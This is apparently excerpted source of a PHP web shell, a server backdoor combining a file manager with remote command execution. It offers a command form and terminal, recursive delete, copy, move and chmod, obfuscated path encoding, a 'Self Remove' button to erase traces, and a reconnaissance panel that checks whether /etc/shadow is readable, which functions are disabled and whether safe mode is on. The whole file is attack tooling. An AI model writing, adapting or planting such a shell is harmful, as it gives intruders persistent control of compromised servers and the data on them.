...
if (!function_exists('json_decode')) {
    function json_decode($json, $assoc = false) {
        ...
        if (is_numeric($json)) return floatval($json);
        if ($json[0] === '"') return stripslashes(substr($json, 1, -1));
        if ($json[0] === '{' || $json[0] === '[') {
...
if (!function_exists('file_put_contents')) {
    function file_put_contents($filename, $data, $flags = 0) {
        ...
        if (!$fp) return false;
        if ($flags & 1) flock($fp, 2);
        $bytes = fwrite($fp, $data);
        if ($flags & 1) flock($fp, 3);
        fclose($fp);
        return $bytes;
    }
}
...
function basezero_decoder($input) { 
    if (strlen($input) % 2 != 0) return false; 
    $alphabet = BASEZERO_ALPHABET; 
    $base = strlen($alphabet); 
    $output = ''; 
    $map = array_flip(str_split($alphabet)); 
    for ($i = 0; $i < strlen($input); $i += 2) { 
        if (!isset($map[$input[$i]]) || !isset($map[$input[$i+1]])) return false; 
...
function format_size($bytes) { 
    if ($bytes === false || !is_numeric($bytes)) return 'N/A'; 
...
function execute_command($command, $working_directory = null) {
    ...
    foreach ($methods as $method) {
        if (!function_exists($method)) continue;
...
function delete_recursive($path) { 
    ...
    foreach ($files as $file) delete_recursive($path . DIRECTORY_SEPARATOR . $file); 
    return rmdir($path); 
}
...
function copy_recursive($source, $dest) { 
    ...
    foreach ($files as $file) copy_recursive($source . DIRECTORY_SEPARATOR . $file, $dest . DIRECTORY_SEPARATOR . $file); 
    return true; 
}
...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
            ...
            if ($bulk_action === 'paste' && $clipboard) { 
                ...
                foreach ($clipboard['sources'] as $source) { 
                    ...
                    if ($clipboard['action'] === 'copy') { 
                        if (copy_recursive($source, $dest)) $count++; 
                    } elseif ($clipboard['action'] === 'move') { 
                        if (rename($source, $dest)) $count++; 
                    } 
                } 
                ...
                switch ($bulk_action) {
                    case 'delete': 
                        $count = 0; 
                        foreach ($selected_files as $f) if (delete_recursive($f)) $count++; 
    ...
    if ($message) $_SESSION['fm_message'] = $message;
...
// Icons
$icons = array(
    'dir' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M10 4H4c-1.11 0-2 .89-2 2v12a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V8c0-1.11-.9-2-2-2h-8l-2-2z"/></svg>',
    'file' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8l-6-6zM6 20V4h7v5h5v11H6z"/></svg>',
    'edit' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04a.996.996 0 0 0 0-1.41l-2.34-2.34a.996.996 0 0 0-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/></svg>',
    'rename' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 4H6c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zM6 6h12v2H6V6zm0 4h8v2H6v-2zm0 4h10v2H6v-2z"/></svg>',
    'chmod' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-1.07 15.35L6.5 12.93l1.41-1.41L10.93 15l4.24-4.24L16.59 12l-5.66 5.35z"/></svg>',
    'touch' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm3.36 12.32l-4.24-2.53.01-6.44h1.75v5.21l3.41 2.03-1 1.73z"/></svg>',
    'download' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z"/></svg>',
    'terminal' => '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M2 3h20c1.1 0 2 .9 2 2v14c0 1.1-.9 2-2 2H2c-1.1 0-2-.9-2-2V5c0-1.1.9-2 2-2zm0 2v14h20V5H2zm2 2h2v2H4V7zm4 0h2v2H8V7z"/></svg>',
...
<head>
    ...
    <style>
        ...
        * {
        ...
        .command-container-three-col input[type='text'],
        ...
        /* FIXED: Small buttons for editor */
        .btn-small {
            padding: 4px 8px;
            font-size: 11px;
            border-radius: var(--radius-small);
...
<div class="container" id="app-container">
    <div class="top-control-bar">
        ...
        <div class="top-buttons">
            ...
            <a id="terminal-btn">
                <?php echo $icons['terminal']; ?>
                Terminal
            </a>
            <a id="self-remove-btn" class="danger-btn">Self Remove</a>
        </div>
    </div>
    
    <div class="card server-info">
        <strong>System:</strong> <?php echo php_uname(); ?><br>
        <strong>User:</strong> <?php echo "$user ($uid) Group: $group ($gid)"; ?><br>
        <strong>Server IP:</strong> <?php echo $_SERVER['SERVER_ADDR']; ?> | <strong>Your IP:</strong> <?php echo $_SERVER['REMOTE_ADDR']; ?><br>
        <strong>HDD:</strong> <?php echo format_size($used_space) . ' / ' . format_size($total_space) . ' (Free: ' . format_size($free_space) . ')'; ?><br>
        <strong>Safe Mode:</strong> <?php echo (@ini_get(strtolower("safe_mode")) == 'on') ? "<span class='highlight'>ON</span>" : "OFF"; ?> | 
        <strong>Disabled:</strong> <?php echo empty($disabled_functions) ? "NONE" : "<span class='highlight'>YES</span>"; ?><br>
        <strong>PHP:</strong> <?php echo PHP_VERSION; ?> | <strong>OS:</strong> <?php echo PHP_OS; ?><br>
        <?php foreach ($server_checks as $name => $status): ?>
            <strong><?php echo $name; ?>:</strong> <?php echo $status ? "<span class='highlight'>ON</span>" : "OFF"; ?> | 
        <?php endforeach; ?>
    </div>
    ...
    <div class="nav-bar">
        ...
        <div class="nav-buttons">
            ...
            <a href="#<?php echo basezero_encoder($script_dir); ?>">
                <?php echo $icons['home']; ?>
                Home
            </a>
        </div>
    ...
    <div id="main-content">
        <div id="listing-view">
                ...
                <div class="action-forms">
                    ...
                    <form method="POST">
                        <div class="form-group">
                            ...
                            <input type="hidden" name="current_dir" class="form_current_dir">
                            <input type="text" name="dirname" placeholder="New directory..." required>
            ...
            <!-- FIXED: 3-Column Command Container with Simple Form Submit -->
            <div class="card">
                <div class="command-container-three-col">
                    <div class="execute-section">
                        <form method="POST" style="display: flex; flex-direction: column;">
                            <label>Execute:</label>
                            <input type="hidden" name="action" value="execute_cmd">
                            <input type="hidden" name="current_dir" class="form_current_dir">
                            <input type="text" name="c" placeholder="Quick command execution...">
                    ...
                    <div class="navigate-section">
                        ...
                        <button type="button" id="path-go-btn">Go</button>
                    </div>
                    
                    <div class="openfile-section">
                        <label>Open File:</label>
                        <input type="text" id="file-path-input" placeholder="">
                        <button type="button" id="file-open-btn">Open</button>
                    </div>
                </div>
                
                <?php if (isset($_SESSION['cmd_output'])): ?>
                    <div style="position: relative;">
                        <pre style="background: #0d1117; color: #f0f6fc; padding: 12px; border-radius: var(--radius-small); margin-top: 12px; white-space: pre-wrap; word-break: break-word; font-family: var(--font-mono); font-size: 12px; position: relative;"><?php echo htmlspecialchars($_SESSION['cmd_output']); unset($_SESSION['cmd_output']); ?></pre>
                        <button class="clear-output-btn" onclick="this.parentElement.remove();">✕</button>
                    </div>
                <?php endif; ?>
            </div>

            <div class="search-container">
                <input type="text" id="file-search" placeholder="Search files and directories...">
            </div>
                ...
                <div class="table-header-toolbar">
                    <div class="form-group">
                        ...
                        <select id="bulk-action-select">
                            ...
                            <option value="compress">Compress (TAR.GZ)</option>
                            <option value="download">Download (ZIP)</option>
                        </select>
                        <span id="paste-option-container"></span>
                        <button type="button" id="apply-bulk-action-btn">Apply</button>
                    </div>
                </div>
                <table class="file-table">
                    <thead>
                        <tr>
                            ...
                            <th class="col-owner">Owner:Group</th>
        ...
        <div id="edit-view">
            <div class="card">
                <h3 id="edit-view-filename" style="margin-top:0; word-break:break-all;"></h3>
                ...
                <form id="edit-form">
                    ...
                    <div class="form-group" style="margin-top:16px;">
                        ...
                        <a id="edit-cancel-btn" class="button" style="background:var(--bg-card); color:var(--text-primary); border:1px solid var(--border-color);">Cancel</a>
                    </div>
                </form>
            </div>
        </div>
    ...
    <div id="modal-overlay">
        <div id="modal-box" class="card">
            <h3 id="modal-title" style="margin-top:0;"></h3>
            <form id="modal-form" method="POST">
                <input type="hidden" name="action" id="modal-action">
                <input type="hidden" name="file" id="modal-file-path">
                <input type="hidden" name="current_dir" class="form_current_dir">
                <div id="modal-body" class="form-group"></div>
                <div class="form-group" style="margin-top:16px;">
                    <button type="submit">Save</button>
                    <a id="modal-cancel-btn" class="button" style="background:var(--bg-card); color:var(--text-primary); border:1px solid var(--border-color);">Cancel</a>
                </div>
            </form>
        </div>
    </div>
    ...
    <div id="terminal-modal">
        <div class="card">
            <div class="terminal-header">
                ...
                <button class="terminal-close-btn" id="terminal-close-btn">Close</button>
            </div>
            <div class="command-history" id="command-history"></div>
            <div class="terminal-container">
                <div class="terminal-output" id="terminal-output"></div>
                <div class="terminal-input-container">
                    <input type="text" id="terminal-input" name="c" class="terminal-input" placeholder="Enter command...">
                    <button type="button" id="terminal-send" class="terminal-send">Send</button>
                </div>
            </div>
        </div>
    </div>
    ...
    const app = {
        ...
        showSecurityInfo() {
            ...
            const infoHtml = `
                <div style="font-family: var(--font-mono); font-size: 12px; line-height: 1.6; max-height: 60vh; overflow-y: auto;">
                    ...
                    <strong>OS:</strong> <?php echo php_uname(); ?><br><br>
                    ...
                    <strong>cURL support:</strong> <?php echo function_exists('curl_version') ? 'enabled' : 'disabled'; ?><br>
                    <strong>MySQLi support:</strong> <?php echo extension_loaded('mysqli') ? 'enabled' : 'disabled'; ?><br><br>
                    
                    <strong>Readable /etc/passwd:</strong> <?php echo is_readable('/etc/passwd') ? 'yes' : 'no'; ?><br>
                    <strong>Readable /etc/shadow:</strong> <?php echo is_readable('/etc/shadow') ? 'yes' : 'no'; ?><br><br>
                    
                    <strong>OS version:</strong><br>
                    <?php echo @file_get_contents('/proc/version') ? @file_get_contents('/proc/version') : 'N/A'; ?><br><br>
        ...
        updatePathBar({ breadcrumbs, permission_status, is_windows }) {
            ...
            if (is_windows) {
                ...
                html += `<a href="#${basezero_encoder_js(rootPath)}" class="path-root">
                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M6 2c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V8l-6-6H6zm0 2h7v5h5v11H6V4z"/></svg>
                    ${driveLetter}:\\
                </a>`;
            } else {
            ...
            breadcrumbs.forEach((p, index) => { 
                ...
                html += `<span>/</span><a href="#${basezero_encoder_js(p.path)}"${customClass}>${p.name}</a>`; 
            });
            
            html += `<span class="path-status ${permission_status}">[ ${permission_status.charAt(0).toUpperCase() + permission_status.slice(1)} ]</span>`;
        ...
        updateFileList(files) {
            ...
            files.forEach((f, index) => {
                html += `<tr class="item-row" data-index="${index}"><td class="col-select"><input type="checkbox" name="selected_files[]" value="${f.path}" class="item-checkbox" style="width:18px;height:18px;"></td>`;
                const icon = f.type === 'dir' ? ICONS.dir : ICONS.file;
                
                let nameLink;
                if (f.type === 'dir') {
                    nameLink = `<a href="#${basezero_encoder_js(f.path)}" data-path="${f.path}" data-is-dir="true">${icon}${f.name}</a>`;
                } else {
                    nameLink = `<a href="#" class="file-edit-link" data-path="${f.path}" data-name="${f.name}" data-is-dir="false">${icon}${f.name}</a>`;
                }
                
                html += `<td class="col-name"><div title="${f.path}">${nameLink}</div></td>`;
                html += `<td class="col-size">${f.size}</td><td class="col-owner">${f.owner}</td><td class="col-perms perms-${f.permission_status}">${f.perms}</td><td class="col-date">${f.modified}</td>`;
                ...
                html += `<td class="text-actions">${actions}</td></tr>`;
            });
        ...
        showContextMenu(x, y) {
            ...
            menuItems.forEach(item => {
                html += `<div class="context-menu-item" data-action="${item.action}">${item.icon} ${item.text}</div>`;
            });
            
            this.contextMenu.innerHTML = html;
            
            const menuRect = { width: 160, height: menuItems.length * 42 + 8 };
        ...
        // FIXED: Show edit view with CONSISTENT action buttons for all files
            ...
            try {
                ...
                if (data.success) {
                    ...
                    if (data.file_type === 'binary') {
                        ...
                        infoDiv.innerHTML = `
                            <span style="color: #ff9800;">⚠️ Binary file (${data.printable_ratio}% printable)</span><br>
                        ...
                        // FIXED: Always show action buttons regardless of how editor was opened
                        infoDiv.innerHTML = `
                            <div style="margin-bottom: 8px;">
        ...
        showMessage(msg, isError = false) { 
            this.messageContainer.innerHTML = `<div class="message ${isError ? 'error' : ''}">${msg}</div>`; 
            setTimeout(() => this.messageContainer.innerHTML = '', isError ? 4000 : 1500);
        },
